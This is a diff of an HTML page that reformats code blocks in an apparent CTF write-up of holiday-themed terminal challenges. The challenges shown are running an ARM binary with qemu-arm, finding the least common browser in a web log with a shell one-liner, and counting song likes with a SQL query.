+elf        192  0.0  0.0  34424  2912 pts/0    R+   06:34   0:00 ps aux
+</code></pre>
+
 <h2 id="there-s-snow-place-like-home">THERE&rsquo;S SNOW PLACE LIKE HOME</h2>
 
 <h3 id="train-startup">Train Startup</h3>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="">                             ______
-</span><span style="">                          .-</span><span style="color:#e6db74">&#34;&#34;&#34;&#34;</span><span style="">.._</span><span style="color:#e6db74">&#39;.       _,##
-</span><span style="color:#e6db74">                   _..__ |.-&#34;&#34;&#34;-.|  |   _,##&#39;</span><span style="color:#e6db74">`</span><span style="">-._
-</span><span style="">                  </span><span style="color:#f92672">(</span><span style="">_____</span><span style="color:#f92672">)||</span><span style="">_____</span><span style="color:#f92672">||</span><span style="">  </span><span style="">|</span><span style="">_,##</span><span style="color:#e6db74">&#39;`-._,##&#39;</span><span style="color:#e6db74">`</span><span style="">
-</span><span style="">                  _</span><span style="">|</span><span style="">   </span><span style="">|</span><span style="">.</span><span style="">;</span><span style="">-</span><span style="color:#e6db74">&#34;&#34;</span><span style="">-.  </span><span style="">|</span><span style="">  </span><span style="">|</span><span style="color:#75715e">#&#39;`-._,##&#39;`
-</span><span style="color:#75715e"></span><span style="">               _.</span><span style="">;</span><span style="">_ </span><span style="color:#e6db74">`</span><span style="">--</span><span style="color:#e6db74">&#39; `\    \ |.&#39;</span><span style="color:#e6db74">`</span><span style="color:#ae81ff">\.</span><span style="">_,##</span><span style="color:#e6db74">&#39;`
-</span><span style="color:#e6db74">              /.-.\ `\     |.-&#34;;.`_, |##&#39;</span><span style="color:#e6db74">`</span><span style="">
-</span><span style="">              </span><span style="">|</span><span style="color:#ae81ff">\_</span><span style="">_/   </span><span style="">|</span><span style=""> _..</span><span style="">;</span><span style="">__  </span><span style="">|</span><span style="color:#e6db74">&#39;-&#39;</span><span style=""> /
-</span><span style="">              </span><span style="color:#e6db74">&#39;.____.&#39;</span><span style="">_.-</span><span style="color:#e6db74">`</span><span style="color:#f92672">)</span><span style="color:#ae81ff">\-</span><span style="">-</span><span style="color:#e6db74">&#39; /&#39;</span><span style="">-</span><span style="color:#e6db74">&#39;`
-</span><span style="color:#e6db74">               //||\\(_.-&#39;</span><span style="">_,</span><span style="color:#e6db74">&#39;-&#39;</span><span style="color:#e6db74">`</span><span style="">
-</span><span style="">             </span><span style="color:#f92672">(</span><span style="color:#e6db74">`</span><span style="">-...-</span><span style="color:#e6db74">&#39;)_,##&#39;</span><span style="color:#e6db74">`</span><span style="">
-</span><span style="">      jgs _,##</span><span style="color:#e6db74">`</span><span style="">-..,-</span><span style="">;</span><span style="color:#75715e">##`
-</span><span style="color:#75715e"></span><span style="">       _,##</span><span style="color:#e6db74">&#39;`-._,##&#39;</span><span style="color:#e6db74">`</span><span style="">
-</span><span style="">    _,##</span><span style="color:#e6db74">&#39;`-._,##&#39;</span><span style="color:#e6db74">`</span><span style="">
-</span><span style="">      </span><span style="color:#e6db74">`</span><span style="">-._,##</span><span style="color:#e6db74">&#39;`
-</span><span style="color:#e6db74">My name is Pepper Minstix, and I need your help with my plight.
-</span><span style="color:#e6db74">I&#39;</span><span style="">ve crashed the Christmas toy train, </span><span style="color:#66d9ef">for</span><span style=""> which I am quite contrite.
-</span><span style="">I should not have interfered, hacking it was foolish in hindsight.
-</span><span style="">If you can get it running again, I will reward you with a gift of delight.
-</span><span style="">total </span><span style="color:#ae81ff">444</span><span style="">
-</span><span style="">-rwxr-xr-x </span><span style="color:#ae81ff">1</span><span style=""> root root </span><span style="color:#ae81ff">454636</span><span style=""> Dec  </span><span style="color:#ae81ff">7</span><span style=""> </span><span style="color:#ae81ff">18</span><span style="">:43 trainstartup</span></code></pre>
-</div>
+
+<pre><code class="language-bash">                             ______
+                          .-&quot;&quot;&quot;&quot;.._'.       _,##
+                   _..__ |.-&quot;&quot;&quot;-.|  |   _,##'`-._
+                  (_____)||_____||  |_,##'`-._,##'`
+                  _|   |.;-&quot;&quot;-.  |  |#'`-._,##'`
+               _.;_ `--' `\    \ |.'`\._,##'`
+              /.-.\ `\     |.-&quot;;.`_, |##'`
+              |\__/   | _..;__  |'-' /
+              '.____.'_.-`)\--' /'-'`
+               //||\\(_.-'_,'-'`
+             (`-...-')_,##'`
+      jgs _,##`-..,-;##`
+       _,##'`-._,##'`
+    _,##'`-._,##'`
+      `-._,##'`
+My name is Pepper Minstix, and I need your help with my plight.
+I've crashed the Christmas toy train, for which I am quite contrite.
+I should not have interfered, hacking it was foolish in hindsight.
+If you can get it running again, I will reward you with a gift of delight.
+total 444
+-rwxr-xr-x 1 root root 454636 Dec  7 18:43 trainstartup
+</code></pre>
+
 <p>We are prompted to run a binary. Let&rsquo;s see which architecture this binary is:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="">elf@f533c87441b9:~$ file trainstartup 
-</span><span style="">trainstartup: ELF </span><span style="color:#ae81ff">32</span><span style="">-bit LSB  executable, ARM, EABI5 version </span><span style="color:#ae81ff">1</span><span style=""> </span><span style="color:#f92672">(</span><span style="">GNU/Linux</span><span style="color:#f92672">)</span><span style="">, statically linked, </span><span style="color:#66d9ef">for</span><span style=""> GNU/Linux </span><span style="color:#ae81ff">3</span><span style="">.2.0, BuildID</span><span style="color:#f92672">[</span><span style="">sha1</span><span style="color:#f92672">]=</span><span style="">005de4685e8563d10b3de3
-</span><span style="">e0be7d6fdd7ed732eb, not stripped</span></code></pre>
-</div>
+
+<pre><code class="language-bash">elf@f533c87441b9:~$ file trainstartup 
+trainstartup: ELF 32-bit LSB  executable, ARM, EABI5 version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=005de4685e8563d10b3de3
+e0be7d6fdd7ed732eb, not stripped
+</code></pre>
+
 <p>So this is an ARM binary. There is <code>qemu-arm</code> on the machine. Just gotta use it</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="">elf@f533c87441b9:~$ qemu-arm ./trainstartup
-</span><span style="">
-</span><span style="">    Merry Christmas
-</span><span style="">    Merry Christmas
-</span><span style="">v
-</span><span style="">&gt;*&lt;
-</span><span style="">^
-</span><span style="">/o</span><span style="color:#ae81ff">\
-</span><span style="color:#ae81ff"></span><span style="">/   </span><span style="color:#ae81ff">\ </span><span style="">              @.·
-</span><span style="">/~~   </span><span style="color:#ae81ff">\ </span><span style="">               .
-</span><span style="">/ ° ~~  </span><span style="color:#ae81ff">\ </span><span style="">        · .    
-</span><span style="">/      ~~ </span><span style="color:#ae81ff">\ </span><span style="">      ◆  ·    
-</span><span style="">/     °   ~~</span><span style="color:#ae81ff">\ </span><span style="">   ·     </span><span style="color:#ae81ff">0</span><span style="">
-</span><span style="">/~~           </span><span style="color:#ae81ff">\ </span><span style="">  .─··─ · o
-</span><span style="">             /°  ~~  .*· · . </span><span style="color:#ae81ff">\ </span><span style=""> ├──┼──┤                                        
-</span><span style="">              │  ──┬─°─┬─°─°─°─ └──┴──┘                                        
-</span><span style="">≠</span><span style="color:#f92672">==</span><span style="">≠</span><span style="color:#f92672">==</span><span style="">≠</span><span style="color:#f92672">==</span><span style="">≠</span><span style="color:#f92672">==</span><span style="">──┼──</span><span style="color:#f92672">=</span><span style="">≠     ≠</span><span style="color:#f92672">=</span><span style="">≠</span><span style="color:#f92672">==</span><span style="">≠</span><span style="color:#f92672">==</span><span style="">≠</span><span style="color:#f92672">==</span><span style="">≠</span><span style="color:#f92672">==</span><span style="">≠</span><span style="color:#f92672">==</span><span style="">≠</span><span style="color:#f92672">==</span><span style="">≠</span><span style="color:#f92672">==</span><span style="">≠</span><span style="color:#f92672">==</span><span style="">≠</span><span style="color:#f92672">==</span><span style="">≠</span><span style="color:#f92672">==</span><span style="">≠</span><span style="color:#f92672">==</span><span style="">≠</span><span style="color:#f92672">==</span><span style="">≠</span><span style="color:#f92672">==</span><span style="">≠</span><span style="color:#f92672">==</span><span style="">≠</span><span style="color:#f92672">==</span><span style="">≠</span><span style="color:#f92672">==</span><span style="">≠</span><span style="color:#f92672">===</span><span style="">≠
-</span><span style="">              │   /└───┘</span><span style="color:#ae81ff">\┌</span><span style="">───┐       ┌┐                                        
-</span><span style="">                         └───┘    /▒▒▒▒                                        
-</span><span style="">≠</span><span style="color:#f92672">==</span><span style="">≠</span><span style="color:#f92672">==</span><span style="">≠</span><span style="color:#f92672">==</span><span style="">≠</span><span style="color:#f92672">==</span><span style="">≠</span><span style="color:#f92672">==</span><span style="">≠</span><span style="color:#f92672">==</span><span style="">≠</span><span style="color:#f92672">==</span><span style="">≠</span><span style="color:#f92672">==</span><span style="">≠</span><span style="color:#f92672">==</span><span style="">≠</span><span style="color:#f92672">==</span><span style="">≠</span><span style="color:#f92672">==</span><span style="">≠</span><span style="color:#f92672">=</span><span style="">°≠</span><span style="color:#f92672">=</span><span style="">°≠</span><span style="color:#f92672">==</span><span style="">≠</span><span style="color:#f92672">==</span><span style="">≠</span><span style="color:#f92672">==</span><span style="">≠</span><span style="color:#f92672">==</span><span style="">≠</span><span style="color:#f92672">==</span><span style="">≠</span><span style="color:#f92672">==</span><span style="">≠</span><span style="color:#f92672">==</span><span style="">≠</span><span style="color:#f92672">==</span><span style="">≠</span><span style="color:#f92672">==</span><span style="">≠</span><span style="color:#f92672">==</span><span style="">≠</span><span style="color:#f92672">==</span><span style="">≠</span><span style="color:#f92672">==</span><span style="">≠</span><span style="color:#f92672">==</span><span style="">≠
-</span><span style="">You did it! Thank you!</span></code></pre>
-</div>
+
+<pre><code class="language-bash">elf@f533c87441b9:~$ qemu-arm ./trainstartup
+
+    Merry Christmas
+    Merry Christmas
+v
+&gt;*&lt;
+^
+/o\
+/   \               @.·
+/~~   \                .
+/ ° ~~  \         · .    
+/      ~~ \       ◆  ·    
+/     °   ~~\    ·     0
+/~~           \   .─··─ · o
+             /°  ~~  .*· · . \  ├──┼──┤                                        
+              │  ──┬─°─┬─°─°─°─ └──┴──┘                                        
+≠==≠==≠==≠==──┼──=≠     ≠=≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠===≠
+              │   /└───┘\┌───┐       ┌┐                                        
+                         └───┘    /▒▒▒▒                                        
+≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠=°≠=°≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠
+You did it! Thank you!
+</code></pre>
+
 <h2 id="blumbles-bounce">BLUMBLES BOUNCE</h2>
 
 <h3 id="web-log">Web Log</h3>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="">                           ._    _.
-</span><span style="">                           </span><span style="color:#f92672">(</span><span style="">_</span><span style="color:#f92672">)</span><span style="">  </span><span style="color:#f92672">(</span><span style="">_</span><span style="color:#f92672">)</span><span style="">                  &lt;&gt; </span><span style="color:#ae81ff">\ </span><span style=""> / &lt;&gt;
-</span><span style="">                            .</span><span style="color:#ae81ff">\:</span><span style="">:/.                   </span><span style="color:#ae81ff">\_\/</span><span style="">  </span><span style="color:#ae81ff">\/</span><span style="">_/ 
-</span><span style="">           .:.          _.</span><span style="color:#f92672">=</span><span style="">._</span><span style="color:#ae81ff">\\</span><span style="">//_.</span><span style="color:#f92672">=</span><span style="">._                  </span><span style="color:#ae81ff">\\</span><span style="">//
-</span><span style="">      ..   </span><span style="color:#ae81ff">\o</span><span style="">/   ..      </span><span style="color:#e6db74">&#39;=&#39;</span><span style=""> //</span><span style="color:#ae81ff">\\</span><span style=""> </span><span style="color:#e6db74">&#39;=&#39;</span><span style="">             _&lt;&gt;_</span><span style="color:#ae81ff">\_\&lt;</span><span style="">&gt;/_/_&lt;&gt;_
-</span><span style="">      :o</span><span style="">|</span><span style="">   </span><span style="">|</span><span style="">   </span><span style="">|</span><span style="">o:         </span><span style="color:#e6db74">&#39;/::\&#39;</span><span style="">                 &lt;&gt; / /&lt;&gt;</span><span style="color:#ae81ff">\ \ </span><span style="">&lt;&gt;
-</span><span style="">       ~ </span><span style="color:#e6db74">&#39;. &#39;</span><span style=""> .</span><span style="color:#e6db74">&#39; ~         (_)  (_)      _    _       _ //\\ _
-</span><span style="color:#e6db74">           &gt;O&lt;             &#39;</span><span style="">      </span><span style="color:#e6db74">&#39;     /_/  \_\     / /\  /\ \
-</span><span style="color:#e6db74">       _ .&#39;</span><span style=""> . </span><span style="color:#e6db74">&#39;. _                        \\//       &lt;&gt; /  \ &lt;&gt;
-</span><span style="color:#e6db74">      :o|   |   |o:                   /\_\\&gt;&lt;//_/\
-</span><span style="color:#e6db74">      &#39;&#39;   /o\   &#39;&#39;     &#39;</span><span style="">.</span><span style="">|</span><span style="">  </span><span style="">|</span><span style="">.</span><span style="color:#e6db74">&#39;      \/ //&gt;&lt;\\ \/
-</span><span style="color:#e6db74">           &#39;</span><span style="">:</span><span style="color:#e6db74">&#39;        . ~~\  /~~ .       _//\\_
-</span><span style="color:#e6db74">jgs                   _\_._\/_._/_      \_\  /_/ 
-</span><span style="color:#e6db74">                       / &#39;</span><span style=""> /</span><span style="color:#ae81ff">\ </span><span style="color:#e6db74">&#39; \                   \o/
-</span><span style="color:#e6db74">       o              &#39;</span><span style=""> __/  </span><span style="color:#ae81ff">\_</span><span style="">_ </span><span style="color:#e6db74">&#39;              _o/.:|:.\o_
-</span><span style="color:#e6db74">  o    :    o         &#39;</span><span style=""> .</span><span style="color:#e6db74">&#39;|  |&#39;</span><span style="">.                  .</span><span style="color:#ae81ff">\:</span><span style="">|</span><span style="">:/.
-</span><span style="">    </span><span style="color:#e6db74">&#39;.\&#39;</span><span style="">/.</span><span style="color:#e6db74">&#39;                 .                 -=&gt;&gt;::&gt;o&lt;::&lt;&lt;=-
-</span><span style="color:#e6db74">    :-&gt;@&lt;-:                 :                   _ &#39;</span><span style="">/:</span><span style="">|</span><span style="">:</span><span style="color:#ae81ff">\&#39;</span><span style=""> _
-</span><span style="">    .</span><span style="color:#e6db74">&#39;/.\&#39;</span><span style="">.           </span><span style="color:#e6db74">&#39;.___/*\___.&#39;</span><span style="">              o</span><span style="color:#ae81ff">\&#39;</span><span style="">:</span><span style="">|</span><span style="">:</span><span style="color:#e6db74">&#39;/o 
-</span><span style="color:#e6db74">  o    :    o           \* \ / */                   /o\
-</span><span style="color:#e6db74">       o                 &gt;--X--&lt;
-</span><span style="color:#e6db74">                        /*_/ \_*\
-</span><span style="color:#e6db74">                      .&#39;</span><span style="">   </span><span style="color:#ae81ff">\*</span><span style="">/   </span><span style="color:#e6db74">&#39;.
-</span><span style="color:#e6db74">                            :
-</span><span style="color:#e6db74">                            &#39;</span><span style="">
-</span><span style="">Minty Candycane here, I need your </span><span style="">help</span><span style=""> straight away.
-</span><span style="">We</span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="">re having an argument about browser popularity stray.
-</span><span style="">Use the supplied log file from our server in the North Pole.
-</span><span style="">Identifying the least-popular browser is your noteworthy goal.</span></code></pre>
-</div>
+
+<pre><code class="language-bash">                           ._    _.
+                           (_)  (_)                  &lt;&gt; \  / &lt;&gt;
+                            .\::/.                   \_\/  \/_/ 
+           .:.          _.=._\\//_.=._                  \\//
+      ..   \o/   ..      '=' //\\ '='             _&lt;&gt;_\_\&lt;&gt;/_/_&lt;&gt;_
+      :o|   |   |o:         '/::\'                 &lt;&gt; / /&lt;&gt;\ \ &lt;&gt;
+       ~ '. ' .' ~         (_)  (_)      _    _       _ //\\ _
+           &gt;O&lt;             '      '     /_/  \_\     / /\  /\ \
+       _ .' . '. _                        \\//       &lt;&gt; /  \ &lt;&gt;
+      :o|   |   |o:                   /\_\\&gt;&lt;//_/\
+      ''   /o\   ''     '.|  |.'      \/ //&gt;&lt;\\ \/
+           ':'        . ~~\  /~~ .       _//\\_
+jgs                   _\_._\/_._/_      \_\  /_/ 
+                       / ' /\ ' \                   \o/
+       o              ' __/  \__ '              _o/.:|:.\o_
+  o    :    o         ' .'|  |'.                  .\:|:/.
+    '.\'/.'                 .                 -=&gt;&gt;::&gt;o&lt;::&lt;&lt;=-
+    :-&gt;@&lt;-:                 :                   _ '/:|:\' _
+    .'/.\'.           '.___/*\___.'              o\':|:'/o 
+  o    :    o           \* \ / */                   /o\
+       o                 &gt;--X--&lt;
+                        /*_/ \_*\
+                      .'   \*/   '.
+                            :
+                            '
+Minty Candycane here, I need your help straight away.
+We're having an argument about browser popularity stray.
+Use the supplied log file from our server in the North Pole.
+Identifying the least-popular browser is your noteworthy goal.
+</code></pre>
+
 <p>One-liner:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="">cat access.log </span><span style="">|</span><span style=""> grep GET </span><span style="">|</span><span style=""> cut -d</span><span style="color:#e6db74">&#39;&#34;&#39;</span><span style=""> -f </span><span style="color:#ae81ff">6</span><span style=""> </span><span style="">|</span><span style=""> sort </span><span style="">|</span><span style=""> uniq -c  </span><span style="">|</span><span style=""> sort </span><span style="">|</span><span style=""> head -n </span><span style="color:#ae81ff">1</span></code></pre>
-</div>
+
+<pre><code class="language-bash">cat access.log | grep GET | cut -d'&quot;' -f 6 | sort | uniq -c  | sort | head -n 1
+</code></pre>
+
 <p>Result:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="">elf@474bcdbda1dd:~$ ./runtoanswer 
-</span><span style="">Starting up, please wait......
-</span><span style="">Enter the name of the least popular browser in the web log: Dillo/3.0.5
-</span><span style="">That is the least common browser in the web log! Congratulations!</span></code></pre>
-</div>
+
+<pre><code class="language-bash">elf@474bcdbda1dd:~$ ./runtoanswer 
+Starting up, please wait......
+Enter the name of the least popular browser in the web log: Dillo/3.0.5
+That is the least common browser in the web log! Congratulations!
+</code></pre>
+
 <h2 id="i-don-t-think-we-re-in-kansas-anymore">I DON&rsquo;T THINK WE&rsquo;RE IN KANSAS ANYMORE</h2>
 
 <h3 id="christmas-songs-data-analysis">Christmas Songs data analysis</h3>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="">                       *
-</span><span style="">                      .~</span><span style="color:#e6db74">&#39;
-</span><span style="color:#e6db74">                     O&#39;</span><span style="">~..
-</span><span style="">                    ~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..
-</span><span style="">                   ~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;
-</span><span style="color:#e6db74">                  O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~.
-</span><span style="">                 .~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~
-</span><span style="">                ..~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~.
-</span><span style="">               .~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;
-</span><span style="color:#e6db74">              O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..
-</span><span style="">             ~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..
-</span><span style="">            ~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;
-</span><span style="color:#e6db74">           O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~.
-</span><span style="">          .~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~
-</span><span style="">         ..~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~.
-</span><span style="">        .~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;
-</span><span style="color:#e6db74">       O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..
-</span><span style="">      ~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..
-</span><span style="">     ~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;
-</span><span style="color:#e6db74">    O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~.
-</span><span style="">   .~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~
-</span><span style="">  ..~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~.
-</span><span style=""> .~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;
-</span><span style="color:#e6db74">O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..~</span><span style="color:#e6db74">&#39;O&#39;</span><span style="">~..
-</span><span style="">Sugarplum Mary is in a tizzy, we hope you can assist.
-</span><span style="">Christmas songs abound, with many likes in our midst.
-</span><span style="">The database is populated, ready </span><span style="color:#66d9ef">for</span><span style=""> you to address.
-</span><span style="">Identify the song whose popularity is the best.
-</span><span style="">total </span><span style="color:#ae81ff">20684</span><span style="">
-</span><span style="">-rw-r--r-- </span><span style="color:#ae81ff">1</span><span style=""> root root </span><span style="color:#ae81ff">15982592</span><span style=""> Nov </span><span style="color:#ae81ff">29</span><span style=""> </span><span style="color:#ae81ff">19</span><span style="">:28 christmassongs.db
-</span><span style="">-rwxr-xr-x </span><span style="color:#ae81ff">1</span><span style=""> root root  </span><span style="color:#ae81ff">5197352</span><span style=""> Dec  </span><span style="color:#ae81ff">7</span><span style=""> </span><span style="color:#ae81ff">15</span><span style="">:10 runtoanswer</span></code></pre>
-</div>
+
+<pre><code class="language-bash">                       *
+                      .~'
+                     O'~..
+                    ~'O'~..
+                   ~'O'~..~'
+                  O'~..~'O'~.
+                 .~'O'~..~'O'~
+                ..~'O'~..~'O'~.
+               .~'O'~..~'O'~..~'
+              O'~..~'O'~..~'O'~..
+             ~'O'~..~'O'~..~'O'~..
+            ~'O'~..~'O'~..~'O'~..~'
+           O'~..~'O'~..~'O'~..~'O'~.
+          .~'O'~..~'O'~..~'O'~..~'O'~
+         ..~'O'~..~'O'~..~'O'~..~'O'~.
+        .~'O'~..~'O'~..~'O'~..~'O'~..~'
+       O'~..~'O'~..~'O'~..~'O'~..~'O'~..
+      ~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..
+     ~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'
+    O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~.
+   .~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~
+  ..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~.
+ .~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'
+O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..
+Sugarplum Mary is in a tizzy, we hope you can assist.
+Christmas songs abound, with many likes in our midst.
+The database is populated, ready for you to address.
+Identify the song whose popularity is the best.
+total 20684
+-rw-r--r-- 1 root root 15982592 Nov 29 19:28 christmassongs.db
+-rwxr-xr-x 1 root root  5197352 Dec  7 15:10 runtoanswer
+</code></pre>
+
 <p>To get the ID of the most popular song, I need to count the number of likes for each unique ID and then sort them in descending order. One way to do this is:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">select</span><span style=""> </span><span style="color:#66d9ef">count</span><span style="">(</span><span style="">songid</span><span style="">)</span><span style=""> </span><span style="color:#66d9ef">count</span><span style="">,</span><span style=""> </span><span style="">songid</span><span style=""> </span><span style="color:#66d9ef">from</span><span style=""> </span><span style="">likes</span><span style=""> </span><span style="color:#66d9ef">group</span><span style=""> </span><span style="color:#66d9ef">by</span><span style=""> </span><span style="">songid</span><span style=""> </span><span style="color:#66d9ef">order</span><span style=""> </span><span style="color:#66d9ef">by</span><span style=""> </span><span style="color:#66d9ef">count</span><span style=""> </span><span style="color:#66d9ef">desc</span><span style=""> </span><span style="color:#66d9ef">limit</span><span style=""> </span><span style="color:#ae81ff">10</span><span style="">;</span></code></pre>
-</div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="">sqlite&gt; </span><span style="color:#66d9ef">select</span><span style=""> count</span><span style="color:#f92672">(</span><span style="">songid</span><span style="color:#f92672">)</span><span style=""> count, songid from likes group by songid order by count desc limit </span><span style="color:#ae81ff">10</span><span style="">;</span><span style="">
-</span><span style=""></span><span style="color:#ae81ff">11325</span><span style="">|</span><span style="color:#ae81ff">392</span><span style="">
-</span><span style=""></span><span style="color:#ae81ff">2162</span><span style="">|</span><span style="color:#ae81ff">245</span><span style="">
-</span><span style=""></span><span style="color:#ae81ff">2140</span><span style="">|</span><span style="color:#ae81ff">265</span><span style="">
-</span><span style=""></span><span style="color:#ae81ff">2132</span><span style="">|</span><span style="color:#ae81ff">207</span><span style="">
-</span><span style=""></span><span style="color:#ae81ff">2129</span><span style="">|</span><span style="color:#ae81ff">98</span><span style="">
-</span><span style=""></span><span style="color:#ae81ff">2126</span><span style="">|</span><span style="color:#ae81ff">90</span><span style="">
-</span><span style=""></span><span style="color:#ae81ff">2122</span><span style="">|</span><span style="color:#ae81ff">33</span><span style="">
-</span><span style=""></span><span style="color:#ae81ff">2120</span><span style="">|</span><span style="color:#ae81ff">130</span><span style="">
-</span><span style=""></span><span style="color:#ae81ff">2117</span><span style="">|</span><span style="color:#ae81ff">18</span><span style="">
-</span><span style=""></span><span style="color:#ae81ff">2117</span><span style="">|</span><span style="color:#ae81ff">446</span></code></pre>
